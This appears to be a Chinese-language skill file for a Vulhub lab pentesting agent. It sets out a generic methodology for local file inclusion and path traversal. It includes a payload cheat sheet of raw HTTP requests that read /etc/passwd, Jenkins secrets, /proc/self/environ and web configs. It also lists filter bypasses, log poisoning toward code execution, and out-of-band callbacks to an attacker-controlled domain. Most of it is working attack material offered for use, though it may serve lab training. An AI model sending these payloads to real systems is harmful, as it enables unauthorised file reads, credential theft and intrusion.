---
name: vulhub-lfi
description: lfi 类型漏洞的通用抽象探测与利用方案
version: 1.0
---

# LFI 抽象化通用渗透与利用指南

## [1] 通用探测思路 (Detection Methodology)

LFI（本地文件包含）漏洞的核心在于应用程序将用户可控的输入作为文件路径或标识符的一部分，用于读取或包含服务器上的文件。攻击者的目标是利用此机制访问超出预期目录的文件，如系统配置文件、源代码或日志。

**探测路径与参数：**
1.  **文件路径参数**：寻找任何接受文件路径、文件名、目录名或资源标识符的参数。常见参数名包括：`file`, `path`, `page`, `include`, `load`, `lang`, `template`, `document`, `url`, `target`, `locale`, `profile`, `config`。
2.  **HTTP 头部注入**：某些应用程序会根据 HTTP 请求头（如 `Accept`、`Host`、`Content-Type`）的内容来动态决定加载哪个文件或资源。
3.  **协议处理器与特殊前缀**：留意使用特殊协议或前缀的路径，例如 `file://`、`@fs`、`phar://`、`zip://`。这些可能被用于直接指定文件系统路径或封装文件。
4.  **API 与端点**：关注处理文件操作、日志查看、插件加载、静态资源服务或配置管理的 API 端点。例如，`/api/console`、`/jobmanager/logs`、`/public/plugins`、`/static`、`/assets`、`/file`。
5.  **命令行接口 (CLI)**：对于提供管理 CLI（如通过 WebSocket 或特定端口）的应用，检查其命令是否支持使用 `@` 符号从文件加载参数。
6.  **文件上传与处理功能**：涉及文件解析、转换（如图片处理、视频转码、文档导入）的功能，可能因为解析器逻辑缺陷导致包含非预期文件。
7.  **序列化数据**：在 POST 数据或 Cookie 中，可能存在序列化的对象（如 JSON、PHP 序列化字符串），其属性值可能被解释为文件路径。

**抽象探测流程：**
*   **基础路径遍历**：在任何可疑参数中尝试注入经典的目录遍历序列 `../` 或 `..\`，目标是读取 `/etc/passwd` (Linux) 或 `C:\Windows\win.ini` (Windows)。
*   **编码绕过**：如果基础遍历被过滤，尝试 URL 编码（`%2e%2e%2f` 对应 `../`）、双重 URL 编码（`%252e%252e%252f`）、Unicode 编码（`%u002e`）、空字节截断（`%00`）或 UTF-8 超长编码（`%c0%ae`）。
*   **特殊字符与组合**：尝试添加无关的查询参数（如 `?raw??`、`?import&raw??`）、在路径中插入空字节或点号的变体（`.%00/`、`%2e/`）。
*   **上下文感知**：根据应用技术栈调整目标文件。例如，在 Java 应用中，目标可能是 `WEB-INF/web.xml`；在 PHP 应用中，可能是 `index.php` 源码或 `phpinfo` 输出的临时文件；在 Node.js 或 Python 应用中，可能是 `package.json` 或 `app.py`。

## [2] 经典漏洞原型与 Payload 字典 (Cheat Sheet)

**A. 基础路径遍历 Payload**
```http
GET /../../../../etc/passwd HTTP/1.1
GET /static/../../../etc/passwd HTTP/1.1
```
**B. URL 编码绕过 Payload**
```http
GET /..%2f..%2f..%2fetc/passwd HTTP/1.1
GET /%252e%252e/%252e%252e/etc/passwd HTTP/1.1
GET /%u002e/WEB-INF/web.xml HTTP/1.1
GET /.%00/WEB-INF/web.xml HTTP/1.1
```
**C. 查询参数污染 Payload**
```http
GET /@fs/etc/passwd?raw?? HTTP/1.1
GET /@fs/etc/passwd?import&raw?? HTTP/1.1
GET /index.php?target=db_sql.php%253f/../../../../etc/passwd HTTP/1.1
```
**D. HTTP 头部注入 Payload**
```http
GET /api/geojson?url=file:////etc/passwd HTTP/1.1
Host: your-ip:3000

GET /assets/images HTTP/1.1
Host: your-ip:3000
Accept: ../../../../../../../../etc/passwd{{

GET /etc/passwd HTTP/1.1
Host: 
```
**E. API/端点路径遍历 Payload**
```http
GET /_plugin/head/../../../../../../../etc/passwd HTTP/1.1
GET /public/plugins/alertlist/../../../../../../../../etc/passwd HTTP/1.1
GET /jobmanager/logs/..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
GET /api/console/api_server?apis=../../../../../../etc/passwd HTTP/1.1
```
**F. 命令行接口 (CLI) 文件读取 Payload**
```bash
# 假设通过某种网络接口执行CLI命令
help 1 @/etc/passwd
connect-node @/var/jenkins_home/secrets/master.key
```
**G. 文件处理/解析器 Payload**
```xml
<!-- 恶意 SVG 文件 -->
<svg xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href=".?../../../../../../etc/passwd" parse="text"/>
</svg>
```
```http
# 图片处理参数
POST /upload HTTP/1.1
Content-Type: multipart/form-data

--boundary
Content-Disposition: form-data; name="file"; filename="exploit.png"
Content-Type: image/png

...PNG数据，包含恶意tEXt块：profile=/etc/passwd...
```
```http
# 视频文件元数据
# 构造一个AVI文件，其元数据指向 file:///etc/passwd
```
**H. 序列化/JSON 数据注入 Payload**
```http
POST /form/webhook HTTP/1.1
Content-Type: application/json

{"files": {"file1": {"filepath": "/etc/passwd", "originalFilename": "test.txt"}}}
```
```http
POST /component_server HTTP/1.1
Content-Type: application/json

{"fn_name": "move_resource_to_block_cache", "data": "/etc/passwd", "session_hash": "xxx"}
```
```http
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_variables={"_metadata":{"classname":"../../../../../../../../proc/self/environ"}}
```
**I. 表单数据路径遍历 Payload**
```http
POST /home.php?mod=spacecp&ac=profile HTTP/1.1
Content-Type: multipart/form-data; boundary=boundary

--boundary
Content-Disposition: form-data; name="birthprovince"

../../../robots.txt
--boundary--
```
**J. 邮件内容触发 Payload**
```html
<!-- 在可被PHPMailer处理的邮件HTML内容中 -->
<img src="/etc/passwd">
```

## [3] 变体与特殊绕过技巧 (Bypass & Tricky Variants)

1.  **多层编码混合**：基础过滤可能只检查一层解码。尝试组合使用，例如双重URL编码后，再在关键位置插入空字节或Unicode编码。
2.  **路径规范化滥用**：某些路径规范化函数在处理如 `foo/../..` 或 `//` 等序列时存在逻辑错误，可能导致遍历超出预期。尝试使用非标准的路径分隔符或重复的目录跳转。
3.  **后缀/参数附加**：在遍历序列后附加正常的文件后缀（如 `.css`、`.js`）或无关的查询字符串（如 `?v=1.0`），可能绕过基于后缀的检查。
4.  **绝对路径与协议**：如果应用允许某种形式的绝对路径或特定协议（如 `file://`），直接使用可能绕过所有相对路径检查。
5.  **符号链接 (Symlink) 利用**：在上传或导入功能中，如果允许上传归档文件（如.tar.gz），可以在归档内创建指向敏感文件（如 `/etc/passwd`）的符号链接。当应用解压并访问该链接时，会读取目标文件。
6.  **条件竞争**：对于需要文件上传并包含的场景（如PHP的临时文件），利用 `phpinfo()` 页面泄露临时文件名，在文件被删除前快速发起包含请求，需要编写脚本自动化。
7.  **日志文件污染**：如果无法直接包含系统文件，但可以控制部分输入（如User-Agent），可以尝试将PHP代码写入应用日志文件，然后包含该日志文件执行代码。
8.  **封装器包装**：在支持PHP封装器的环境中，即使包含的是非PHP文件，也可以使用 `php://filter/convert.base64-encode/resource=` 来读取文件内容，避免代码执行但获取源码。

## [4] 回显与成功判定基准 (Verification)

成功的LFI利用通常会产生明确的回显或可观测的副作用。

1.  **直接文件内容回显**：最直接的证据。当请求包含 `/etc/passwd` 时，在HTTP响应体中查找诸如 `root:x:0:0:`、`daemon:x:1:1:` 等Linux用户账户行。对于Windows，查找 `[fonts]`、`[extensions]` 等段落的 `win.ini` 内容。
2.  **Web应用配置文件泄露**：包含 `WEB-INF/web.xml` (Java) 成功时，会看到XML格式的Servlet配置信息。包含 `config.php`、`database.php` (PHP) 成功时，可能会看到数据库连接字符串等敏感信息（注意可能因代码执行而报错，但信息已泄露）。
3.  **源代码泄露**：包含 `.php`、`.jsp`、`.py` 等源码文件时，响应可能是源码文本（如果服务器未配置为执行），也可能是执行后的空白/错误页面。使用PHP封装器 `php://filter/convert.base64-encode/resource=index.php` 可以稳定地获取Base64编码的源码。
4.  **错误信息差异**：尝试包含一个存在的文件和一个不存在的文件（如 `../../../../etc/passwd` 和 `../../../../etc/passwdxxx`）。如果响应状态码、长度或错误信息有明显不同，则强烈暗示路径遍历成功，但目标文件可能因权限等原因无法读取。
5.  **远程代码执行 (RCE) 验证**：如果LFI导致代码执行（如包含了一个被污染日志文件或上传的Webshell），最有效的验证是执行一个无害的命令并检查回显。例如，在PHP环境中，尝试包含 `?cmd=echo+md5(123)` 并检查响应中是否有 `202cb962ac59075b964b07152d234b70`。
6.  **带外 (OOB) 通道验证**：当没有直接回显时（盲注），可以尝试触发一个到外部服务器的网络连接来确认漏洞。
    *   **DNS 查询**：尝试包含一个指向你控制的域名的URL，如 `http://your-collaborator-domain/?`，或者在某些上下文中使用 `file://` 包装一个 `\\your-collaborator-domain\share` (Windows) 或 `//your-collaborator-domain/test` (某些库处理时)。观察是否有DNS查询到达。
    *   **HTTP 请求**：如果可能包含远程URL，直接让服务器请求你的监听服务器。
7.  **时间延迟验证**：在某些极端盲注情况下，可以尝试包含一个访问速度极慢的网络资源或使用特定封装器制造处理延迟，通过比较响应时间来判断是否成功执行了包含操作。此方法可靠性较低，通常作为辅助手段。

**基准判定流程：**
1.  发送一个针对已知存在且可读的文件（如 `/etc/passwd`）的遍历Payload。
2.  对比发送正常请求（如 `./index.html`）的响应。
3.  如果响应中包含目标文件的预期内容，**漏洞确认**。
4.  如果响应状态码为200，但内容不同，检查是否为目标文件的内容（如二进制数据、配置文件格式）。也可能是包含成功但文件内容被嵌入到HTML中，需要查看页面源代码。
5.  如果返回403/404，尝试其他绕过技巧或目标文件。
6.  如果应用行为发生变化（如错误信息不同），但无直接内容，考虑盲注利用方法（OOB或RCE）。